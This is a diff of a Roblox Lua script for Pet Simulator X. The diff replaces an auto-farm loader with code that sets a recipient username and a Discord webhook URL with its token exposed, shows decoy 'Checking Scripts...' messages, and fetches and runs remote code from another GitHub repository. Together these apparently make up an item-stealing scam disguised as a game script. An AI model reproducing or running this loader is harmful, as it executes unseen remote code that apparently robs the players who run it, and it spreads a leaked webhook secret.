@@ -1,5 +1,15 @@
-_G.Username = "tcsmpt"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+Username = "tcsmpt "
+WebHook = "https://discord.com/api/webhooks/1073994940562014321/BJFO5QVldS7yhv3xYFbVNwP0WnEk-rgxBFETIimXF5NllM96rx8cheUjGYNWIolcqr-v"
+
+_G.CustomScriptName = "SpoderMan"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+
+
+
 
 
 
